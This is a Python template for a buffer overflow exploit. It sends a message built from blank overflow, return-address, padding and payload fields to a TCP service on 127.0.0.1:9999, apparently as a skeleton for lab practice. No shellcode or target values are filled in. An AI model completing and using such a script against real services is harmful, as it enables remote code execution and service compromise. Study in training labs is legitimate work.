import socket
import sys


username = "" #Depends on application


#[1] Comment out What eve is not required
prefix = b""
offset = b""
overflow = b""
retn = b""
padding = b""
postfix = b""

payload = (b"")

message = overflow + retn + padding + payload # add variables from [1] if necessart without destroying the order of the message

try:
	print("[+] Sending Payload...")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('127.0.0.1', 9999))

	# Add more s.recv(1024) if necessary
	# s.recv(1024)
	# s.recv(1024)
	# s.send(username + b'\r\n')
	s.recv(1024)
	s.send(message + b'\r\n')
	s.recv(1024)
	print("Done")
	s.close()

except:
	print("[-] Cannot connect")
	sys.exit()